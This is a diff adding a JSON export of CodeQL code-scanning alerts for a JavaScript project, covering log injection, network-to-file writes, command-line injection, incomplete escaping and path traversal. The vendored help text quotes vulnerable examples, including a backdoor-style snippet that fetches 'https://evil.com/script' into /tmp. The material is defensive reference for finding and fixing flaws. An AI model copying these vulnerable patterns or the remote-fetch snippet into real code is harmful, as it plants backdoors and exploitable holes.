@@ -1,0 +1,914 @@
+[
+  {
+    "number": 49,
+    "created_at": "2025-11-23T18:28:27Z",
+    "updated_at": "2025-11-23T18:28:27Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/49",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/49",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/log-injection",
+      "severity": "error",
+      "description": "Log injection",
+      "name": "js/log-injection",
+      "tags": ["external/cwe/cwe-117", "security"],
+      "full_description": "Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.",
+      "help": "# Log injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using \\`console.info\\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \\`console.error\\`. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is\n})\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\nIn the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    // GOOD: remove newlines from user controlled input before logging\n    let username = q.query.username.replace(/\\n|\\r/g, \"\");\n\n    console.info(`[INFO] User: ${username}`);\n});\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n",
+      "security_severity_level": "medium"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "Log entry depends on a user-provided value.\nLog entry depends on a user-provided value.\nLog entry depends on a user-provided value."
+      },
+      "location": {
+        "path": "src/utils/logger.js",
+        "start_line": 83,
+        "end_line": 83,
+        "start_column": 17,
+        "end_column": 33
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/49/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 16,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/16",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/16",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/http-to-file-access",
+      "severity": "warning",
+      "description": "Network data written to file",
+      "name": "js/http-to-file-access",
+      "tags": ["external/cwe/cwe-434", "external/cwe/cwe-912", "security"],
+      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
+      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
+      "security_severity_level": "medium"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "Write to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data."
+      },
+      "location": {
+        "path": "src/commands/optimize.js",
+        "start_line": 108,
+        "end_line": 108,
+        "start_column": 39,
+        "end_column": 49
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/16/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 15,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/15",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/15",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/http-to-file-access",
+      "severity": "warning",
+      "description": "Network data written to file",
+      "name": "js/http-to-file-access",
+      "tags": ["external/cwe/cwe-434", "external/cwe/cwe-912", "security"],
+      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
+      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
+      "security_severity_level": "medium"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "Write to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data."
+      },
+      "location": {
+        "path": "src/commands/convert.js",
+        "start_line": 172,
+        "end_line": 172,
+        "start_column": 38,
+        "end_column": 48
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/15/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 14,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/14",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/14",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/indirect-command-line-injection",
+      "severity": "warning",
+      "description": "Indirect uncontrolled command line",
+      "name": "js/indirect-command-line-injection",
+      "tags": ["correctness", "external/cwe/cwe-078", "external/cwe/cwe-088", "security"],
+      "full_description": "Forwarding command-line arguments to a child process executed within a shell may indirectly introduce command-line injection vulnerabilities.",
+      "help": "# Indirect uncontrolled command line\nForwarding command-line arguments to `child_process.exec` or some other library routine that executes a system command within a shell can change the meaning of the command unexpectedly due to unescaped special characters.\n\nWhen the forwarded command-line arguments come from a parent process that has not escaped the special characters in the arguments, then the parent process may indirectly be vulnerable to command-line injection since the special characters are evaluated unexpectedly.\n\n\n## Recommendation\nIf possible, use APIs that don't run shell commands and accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.\n\nIf given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.\n\nIf this approach is not viable, then add code to verify that each forwarded command-line argument is properly escaped before using it.\n\n\n## Example\nThe following wrapper script example executes another JavaScript file in a child process and forwards some command-line arguments. This is problematic because the special characters in the command-line arguments may change the meaning of the child process invocation unexpectedly. For instance, if one of the command-line arguments is `\"dollar$separated$name\"`, then the child process will substitute the two environment variables `$separated` and `$name` before invoking `node`.\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execSync(`node ${script} ${args.join(' ')}`); // BAD\n\n```\nIf another program uses `child_process.execFile` to invoke the above wrapper script with input from a remote user, then there may be a command-line injection vulnerability. This may be surprising, since a command-line invocation with `child_process.execFile` is generally considered safe. But in this case, the remote user input is simply forwarded to the problematic `process.exec` call in the wrapper script.\n\nTo guard against this, use an API that does not perform environment variable substitution, such as `child_process.execFile`:\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', [script].concat(args)); // GOOD\n\n```\nIf you want to allow the user to specify other options to `node`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    shellQuote = require(\"shell-quote\");\n\nconst args = process.argv.slice(2);\nlet nodeOpts = '';\nif (args[0] === '--node-opts') {\n    nodeOpts = args[1];\n    args.splice(0, 2);\n}\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', shellQuote.parse(nodeOpts).concat(script).concat(args)); // GOOD\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* npm: [shell-quote](https://www.npmjs.com/package/shell-quote).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n",
+      "security_severity_level": "medium"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This command depends on an unsanitized environment variable."
+      },
+      "location": {
+        "path": "src/utils/gif-optimizer.js",
+        "start_line": 176,
+        "end_line": 176,
+        "start_column": 48,
+        "end_column": 55
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/14/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 13,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/13",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/13",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/incomplete-sanitization",
+      "severity": "warning",
+      "description": "Incomplete string escaping or encoding",
+      "name": "js/incomplete-sanitization",
+      "tags": [
+        "correctness",
+        "external/cwe/cwe-020",
+        "external/cwe/cwe-080",
+        "external/cwe/cwe-116",
+        "security"
+      ],
+      "full_description": "A string transformer that does not replace or escape all occurrences of a meta-character may be ineffective.",
+      "help": "# Incomplete string escaping or encoding\nSanitizing untrusted input is a common technique for preventing injection attacks such as SQL injection or cross-site scripting. Usually, this is done by escaping meta-characters such as quotes in a domain-specific way so that they are treated as normal characters.\n\nHowever, directly using the string `replace` method to perform escaping is notoriously error-prone. Common mistakes include only replacing the first occurrence of a meta-character, or backslash-escaping various meta-characters but not the backslash itself.\n\nIn the former case, later meta-characters are left undisturbed and can be used to subvert the sanitization. In the latter case, preceding a meta-character with a backslash leads to the backslash being escaped, but the meta-character appearing un-escaped, which again makes the sanitization ineffective.\n\nEven if the escaped string is not used in a security-critical context, incomplete escaping may still have undesirable effects, such as badly rendered or confusing output.\n\n\n## Recommendation\nUse a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.\n\nOtherwise, make sure to use a regular expression with the `g` flag to ensure that all occurrences are replaced, and remember to escape backslashes if applicable.\n\n\n## Example\nFor example, assume that we want to embed a user-controlled string `accountNumber` into a SQL query as part of a string literal. To avoid SQL injection, we need to ensure that the string does not contain un-escaped single-quote characters. The following function attempts to ensure this by doubling single quotes, and thereby escaping them:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(\"'\", \"''\");\n}\n\n```\nAs written, this sanitizer is ineffective: if the first argument to `replace` is a string literal (as in this case), only the *first* occurrence of that string is replaced.\n\nAs mentioned above, the function `escapeQuotes` should be replaced with a purpose-built sanitization library, such as the npm module `sqlstring`. Many other sanitization libraries are available from npm and other sources.\n\nIf this is not an option, `escapeQuotes` should be rewritten to use a regular expression with the `g` (\"global\") flag instead:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(/'/g, \"''\");\n}\n\n```\nNote that it is very important to include the global flag: `s.replace(/'/, \"''\")` *without* the global flag is equivalent to the first example above and only replaces the first quote.\n\n\n## References\n* OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* npm: [sqlstring](https://www.npmjs.com/package/sqlstring) package.\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This does not escape backslash characters in the input."
+      },
+      "location": {
+        "path": "test/docker-security.test.js",
+        "start_line": 1347,
+        "end_line": 1348,
+        "start_column": 19,
+        "end_column": 13
+      },
+      "classifications": ["test"]
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/13/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 12,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/12",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/12",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/path-injection",
+      "severity": "error",
+      "description": "Uncontrolled data used in path expression",
+      "name": "js/path-injection",
+      "tags": [
+        "external/cwe/cwe-022",
+        "external/cwe/cwe-023",
+        "external/cwe/cwe-036",
+        "external/cwe/cwe-073",
+        "external/cwe/cwe-099",
+        "security"
+      ],
+      "full_description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
+      "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This path depends on a user-provided value."
+      },
+      "location": {
+        "path": "scripts/serve-site.js",
+        "start_line": 77,
+        "end_line": 77,
+        "start_column": 21,
+        "end_column": 29
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/12/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 11,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/11",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/11",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/path-injection",
+      "severity": "error",
+      "description": "Uncontrolled data used in path expression",
+      "name": "js/path-injection",
+      "tags": [
+        "external/cwe/cwe-022",
+        "external/cwe/cwe-023",
+        "external/cwe/cwe-036",
+        "external/cwe/cwe-073",
+        "external/cwe/cwe-099",
+        "security"
+      ],
+      "full_description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
+      "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This path depends on a user-provided value."
+      },
+      "location": {
+        "path": "scripts/serve-site.js",
+        "start_line": 71,
+        "end_line": 71,
+        "start_column": 21,
+        "end_column": 30
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/11/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 10,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/10",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/10",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/path-injection",
+      "severity": "error",
+      "description": "Uncontrolled data used in path expression",
+      "name": "js/path-injection",
+      "tags": [
+        "external/cwe/cwe-022",
+        "external/cwe/cwe-023",
+        "external/cwe/cwe-036",
+        "external/cwe/cwe-073",
+        "external/cwe/cwe-099",
+        "security"
+      ],
+      "full_description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
+      "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
